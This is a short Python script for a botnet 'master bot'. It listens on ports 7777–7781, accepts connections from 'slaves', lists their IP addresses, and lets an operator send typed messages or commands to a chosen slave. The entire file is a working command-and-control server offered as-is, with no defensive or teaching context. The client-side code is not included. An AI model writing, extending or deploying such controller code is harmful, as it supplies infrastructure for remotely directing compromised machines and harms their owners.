import socket
from threading import Thread

initial_port = 7777
max_bots = 5

threads = []
slaves = []

def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("",port))
    s.listen()
    slave, slave_address = s.accept()
    slaves.append(slave)

def main():
    print("[+] Master bot listening for incoming connections")
    for i in range(max_bots):
        ListenerThread = Thread(target=listen,args=(i+initial_port,), daemon=True)
        threads.append(ListenerThread)
        ListenerThread.start()

    while True:
        if len(slaves)!=0:
            print("[+] Enumerating all slaves.")
            for index, individual_slave in enumerate(slaves):
                print("[i] ", index, ". slave ip: ", individual_slave.getpeername())
            while True:
                slave = int(input("enter the index of the slave you want to communicate with. enter -1 to exit: "))
                if slave == -1:
                    break
                while True:
                    msg = input("[+] enter message: ")
                    slaves[slave].send(msg.encode())
                    if msg == "exit":
                        break
                
            if slave==-1:
                break


if __name__=="__main__":
    # try:
    main()
    # except:
    #     print("Exiting")
    #     exit